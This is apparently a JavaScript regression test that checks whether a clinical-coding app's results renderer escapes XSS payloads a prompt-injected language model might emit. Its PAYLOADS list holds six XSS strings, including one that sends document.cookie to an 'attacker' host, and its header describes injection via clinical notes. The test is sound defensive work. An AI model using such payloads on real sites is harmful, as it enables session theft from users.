/* Runs the extraction-results renderer against prompt-injection payloads.
 *
 * Extraction results come from a language model whose input is an arbitrary
 * clinical note, so a note can carry an injection that makes the model emit
 * markup. Before the escaping fix, all six payloads below produced live
 * elements in the results table.
 *
 * The invariant asserted here is precise: the only HTML elements in the output
 * are ones the template itself creates. Searching for the literal string
 * "javascript:" is NOT a valid test — escaped text legitimately contains it as
 * inert characters.
 *
 *   node scripts/check-xss.js
 */
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";

const here = dirname(fileURLToPath(import.meta.url));
const modulePath = join(here, "..", "frontend", "src", "lib", "results.js");

let formatResults;
try {
  ({ formatResults } = await import("file://" + modulePath.replace(/\\/g, "/")));
} catch (error) {
  console.error(`Could not load ${modulePath}\n${error.message}`);
  process.exit(1);
}

// Guard against the escaping being silently removed from the source.
const source = readFileSync(modulePath, "utf8");
if (!source.includes("esc(")) {
  console.error("FAIL: results.js no longer calls esc() — the XSS fix is missing.");
  process.exit(1);
}

// Elements formatResults is supposed to produce.
const TEMPLATE_TAGS = new Set([
  "div", "span", "tr", "td", "th", "table", "thead", "tbody",
  "p", "br", "caption", "pre", "b", "small", "em", "strong",
  // The code chip and the detail toggle are buttons the template itself emits.
  "button",
]);

const PAYLOADS = [
  '<img src=x onerror="fetch(\'//attacker/\'+document.cookie)">',
  "<script>alert(document.cookie)</script>",
  '"><svg onload=alert(1)>',
  "'><iframe src=javascript:alert(1)>",
  '"><a href="javascript:alert(1)">click</a>',
  "</td></tr><script>alert(1)</script>",
];

let failures = 0;

for (const payload of PAYLOADS) {
  const html = formatResults({
    confirmed_codes: [{
      code_type: "ICD-10-CM", code: payload, description: payload,
      reasoning: payload, confidence: 0.95,
      documentation_strength: "strong", billing_priority: payload,
    }],
    suggested_codes: [{
      code_type: "CPT", code: payload, description: payload,
      reason_suggested: payload, documentation_needed: payload,
    }],
  });

  const rendered = new Set(
    [...html.matchAll(/<\/?([a-zA-Z][a-zA-Z0-9]*)/g)].map((match) => match[1].toLowerCase()),
  );
  const injected = [...rendered].filter((tag) => !TEMPLATE_TAGS.has(tag));
  const liveHandler = /<[a-zA-Z][^>]*\son[a-z]+\s*=/i.test(html);

  const label = payload.length > 44 ? payload.slice(0, 44) + "..." : payload;
  if (injected.length || liveHandler) {
    failures++;
    console.log(`  FAIL  ${label}`);
    if (injected.length) console.log(`        injected elements: ${injected.join(", ")}`);
    if (liveHandler) console.log("        a live event handler survived");
  } else {
    console.log(`  pass  ${label}`);
  }
}

console.log(
  failures
    ? `\n${failures}/${PAYLOADS.length} payload(s) produced live markup — NOT fixed.`
    : `\nAll ${PAYLOADS.length} payloads rendered as inert text. No injected elements.`,
);
process.exit(failures ? 1 : 0);
